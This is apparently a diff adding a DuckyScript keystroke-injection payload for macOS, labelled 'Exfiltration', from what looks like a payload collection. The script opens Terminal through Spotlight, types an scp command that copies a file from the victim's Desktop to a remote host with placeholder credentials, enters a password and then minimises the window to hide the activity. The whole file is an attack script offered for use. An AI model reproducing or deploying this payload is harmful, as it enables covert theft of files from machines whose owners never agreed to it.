@@ -1,0 +1,23 @@
+REM Title: extractFile
+REM Author:	Loux14
+REM Description: Uses SCP to send file to distant computer, must know the user name, file name and location
+REM Target:	MacOs
+REM Version:	1.0
+REM Category: Exfiltration
+
+
+DELAY 2000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 200
+ENTER
+DELAY500
+STRING scp /Users/xxxxx/Desktop/duckyTest2.txt xxxxxxx@xxxxxxxxx:/home/exemple/Documents
+DELAY 500
+ENTER
+DELAY 500
+STRING xxxxxPasswordxxxxx
+ENTER
+DELAY 200
+GUI M
